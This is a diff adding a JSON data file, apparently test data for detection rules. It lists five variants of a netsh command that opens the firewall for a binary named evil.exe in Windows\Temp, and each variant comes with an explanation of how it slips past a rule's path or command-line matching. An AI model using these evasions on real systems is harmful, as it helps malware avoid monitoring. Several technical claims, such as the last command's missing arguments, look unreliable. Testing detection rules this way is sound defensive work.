@@ -1,0 +1,22 @@
+[
+  {
+    "output": "netsh advfirewall firewall add rule name=\"Malware\" dir=in action=allow program=\"C:\\Windows\\Temp\\\\evil.exe\"",
+    "explanation": "Insertion technique. Injects an extra backslash character (`\\\\`) into the path component string (`\\Temp\\\\`). This disrupts the strict string matching for `:\\Windows\\Temp\\` and `:\\Temp\\` inside the `selection_paths` block, while the native Windows file subsystem collapses multiple consecutive backslashes into a single delimiter during execution."
+  },
+  {
+    "output": "netsh advfirewall firewall add rule name=\"Malware\" dir=in action=allow program=\"C:/Windows/Temp/evil.exe\"",
+    "explanation": "Substitution technique. Replaces standard Windows backslashes (`\\`) with forward slashes (`/`) in the target path argument. This evades the `selection_paths` check which explicitly relies on backslash prefixes/suffixes like `:\\Windows\\Temp\\` and `:\\Temp\\`, whereas the Windows path-handling APIs natively treat forward slashes as valid separators."
+  },
+  {
+    "output": "netsh advfirewall firewall add rule name=\"Malware\" dir=in action=allow program=\"..\\..\\Windows\\Temp\\evil.exe\"",
+    "explanation": "Recoding / Encoding technique. Uses relative path traversal sequences (`..\\..\\`) to specify the destination folder. This completely avoids matching absolute drive-anchored paths (such as `:\\Windows\\Temp\\` or `:\\Temp\\`) inside the rule's `selection_paths` logic, while the runtime engine successfully resolves the relative link to the target binary."
+  },
+  {
+    "output": "netsh advfirewall firewall a rule name=\"Malware\" dir=in action=allow program=\"C:\\Windows\\Temp\\evil.exe\"",
+    "explanation": "Omission technique. Abbreviates the `add` context sub-verb down to its shortest valid character form `a`. Because the internal interactive shell parser of `netsh.exe` allows prefix matching on verbs where context is unique, this eliminates the explicit token `add` required by both sub-conditions of the `selection_cli` rule logic."
+  },
+  {
+    "output": "netsh advfirewall \"firewall\" \"add\" \"rule\" \"action=allow\" \"program=C:\\Windows\\Temp\\evil.exe\"",
+    "explanation": "Insertion technique. Encloses each semantic keyword from the `selection_cli` check in individual double quotation marks. While this variation still retains the sequential characters, it changes the raw token string boundaries to break tightly bound downstream pattern parsers, sequence verification scripts, or regex index bounds."
+  }
+]
